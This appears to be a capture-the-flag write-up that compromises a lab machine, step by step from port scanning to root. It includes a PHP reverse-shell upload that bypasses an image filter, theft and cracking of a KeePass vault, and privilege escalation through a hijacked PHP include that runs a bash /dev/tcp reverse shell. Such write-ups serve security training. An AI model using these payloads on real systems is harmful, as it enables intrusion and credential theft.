Starting with basic ping to make sure that I have a connection to the target.
````
PING 10.10.126.252 (10.10.126.252) 56(84) bytes of data.
64 bytes from 10.10.126.252: icmp_seq=1 ttl=63 time=57.5 ms
64 bytes from 10.10.126.252: icmp_seq=2 ttl=63 time=57.3 ms
64 bytes from 10.10.126.252: icmp_seq=3 ttl=63 time=59.8 ms
64 bytes from 10.10.126.252: icmp_seq=4 ttl=63 time=57.9 ms

--- 10.10.126.252 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 57.339/58.129/59.765/0.965 ms
````

A basic Nmap scan to find out which ports are open.
````
Nmap scan report for 10.10.126.252
Host is up (0.060s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 93.99 seconds
````

I then refined the scan a bit to find out more about the services running on the target.
`sudo nmap -sVC -p22,80,139,445 10.10.126.252`
````
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 0f:ee:29:10:d9:8e:8c:53:e6:4d:e3:67:0c:6e:be:e3 (RSA)
|   256 95:42:cd:fc:71:27:99:39:2d:00:49:ad:1b:e4:cf:0e (ECDSA)
|_  256 ed:fe:9c:94:ca:9c:08:6f:f2:5c:a6:cf:4d:3c:8e:5b (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
| http-title: Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2023-11-27T14:39:28
|_  start_date: N/A
|_nbstat: NetBIOS name: OPACITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.60 seconds
````

There is a login page in the webserver so that is where I'm going to start as it's the most promising.
I checked the page source but there was nothing. I then tried a few basic usernames and passwords for the login but to no avail.
Decided to brute force for directories with feroxbuster `feroxbuster -u http://10.10.126.252`.
````
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.126.252
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://10.10.126.252/ => login.php
301      GET        9l       28w      314c http://10.10.126.252/cloud => http://10.10.126.252/cloud/
301      GET        9l       28w      321c http://10.10.126.252/cloud/images => http://10.10.126.252/cloud/images/
[####################] - 63s    90006/90006   0s      found:3       errors:35
[####################] - 55s    30000/30000   544/s   http://10.10.126.252/
[####################] - 44s    30000/30000   686/s   http://10.10.126.252/cloud/
[####################] - 46s    30000/30000   649/s   http://10.10.126.252/cloud/images/
````

`/cloud/` allows uploading images via external URLs. As expected there is a filter that only allows image files to be uploaded. 
I used `https://www.revshells.com/` to generate a PHP reverse shell that I can try to upload. 
I named my reverse shell `rev.php#.png` and hosted it with `python3 -m http.server 8082`
````
Serving HTTP on 0.0.0.0 port 8082 (http://0.0.0.0:8082/) ...
10.10.126.252 - - [27/Nov/2023 17:09:40] "GET /rev.php HTTP/1.1" 404 -
````
The website tries to GET `rev.php` so I renamed the reverse shell `rev.php`
`http://<my_ip>:8082/rev.php#.png` downloads my PHP reverse shell and executes it. I had a listener `ncat -lvnp 1234` that caught the connection.
````
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.126.252:42896.
SOCKET: Shell has connected! PID: 1788
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
````
I went a few directories up and found the `login.php` that has a clear text username and password list for the login page.
The site had pretty much nothing in it sadly.

`cat /etc/passwd | grep -v nologin` checks for users that might have login allowed.
````
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sysadmin:x:1000:1000:sysadmin:/home/sysadmin:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
````

In `sysadmin`s home directory there are a few files I can read but nothing interesting in them.
While checking `/opt` directory I stumbled across `dataset.kdbx` which is a KeePass password vault file.
I could not use SCP to transfer the file so I tried the `/cloud/images` folder. 
So I copied the `dataset.kdbx` to `/var/www/html/cloud/images` and then went to `http://10.10.126.252/cloud/images/dataset.kdbx` to download it.

JohnTheRipper allows us to convert the vault file into a crackable format with `keepass2john dataset.kdbx > hash` .
`john --wordlist=/usr/share/wordlists/rockyou.txt hash` finds the right password for the vault.
I looked at what could I use to open the vault file and found `kpcli`. A `config.ini` file needed to be set to point to the `dataset.kdbx`.


````
kpcli ls --entries
UNLOCKING...

Database password:
================================================================================
Root
================================================================================
user:password
````

````
kpcli get user:password

UNLOCKING...

Database password:
================================================================================
Root/user:password
================================================================================
name: Root/user:password
username: sysadmin
password: **********************
URL:
Notes:
````

````
kpcli cp user:password
UNLOCKING...

Database password:
Entry: Root/user:password
````
Finally, we have the password for `sysadmin` user. Let's try to SSH as `sysadmin` to the target.
````
sysadmin@opacity:~$ id
uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),24(cdrom),30(dip),46(plugdev)
````
We don't have permission to run anything as root but there is `scripts` folder in the user's home folder.
`script.php` has the line `require_once('lib/backup.inc.php');`. `sysadmin` is the owner of the `lib` folder so we can replace the `backup.inc.php` file.
I copied the file to `/home/sysadmin` and added the line `exec("/bin/bash -c 'bash -i > /dev/tcp/your_ip/1234 0>&1'");` to it.
First I had to remove the old file from the folder as it was write-protected. I then copied the file I edited to the original location.
Again, started an Ncat listener with `ncat -lvnp 1234` to catch the incoming connection.
````
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.126.252:36842.
id
uid=0(root) gid=0(root) groups=0(root)
````





